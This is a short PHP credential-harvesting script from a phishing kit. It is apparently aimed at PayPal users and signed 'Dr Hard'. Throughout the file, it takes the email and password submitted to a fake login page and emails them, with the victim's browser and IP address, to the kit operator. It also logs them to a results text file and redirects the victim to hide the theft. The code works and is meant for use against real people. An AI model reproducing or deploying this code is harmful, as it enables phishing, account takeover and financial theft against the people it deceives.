<?php
	error_reporting(0);
	ob_start();
	session_start();
	include '../email.php';
if($_SERVER['REQUEST_METHOD'] == 'POST'){

	$_SESSION['email'] 	= $_POST['mail'];
	$_SESSION['pass'] 	= $_POST['pass'];
$message = "
__________________►| BY Dr Hard |◄__________________
Email: ".$_SESSION['email']."
Password: ".$_SESSION['pass']."
__________________►| BY Dr Hard |◄__________________
User Agent: ".$_SERVER["HTTP_USER_AGENT"]."
IP: http://ip-api.org/#"._ip()."
__________________►| BY Dr Hard |◄__________________";

$Subject="㊣ New Login Info - PPL ㊣ - "._ip();
$head="From: Dr Hard ★ <log>";
mail($my_mail,$Subject,$message,$head);
$fil = fopen('rzlt2hd.txt', 'a+');
fwrite($fil, PHP_EOL.'===============>'.$message.PHP_EOL.'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX END XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX');
$_SESSION['done_email']  = 'done';

header('location: index.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()));

}
else
{
	header('location: ../../index.php');
} 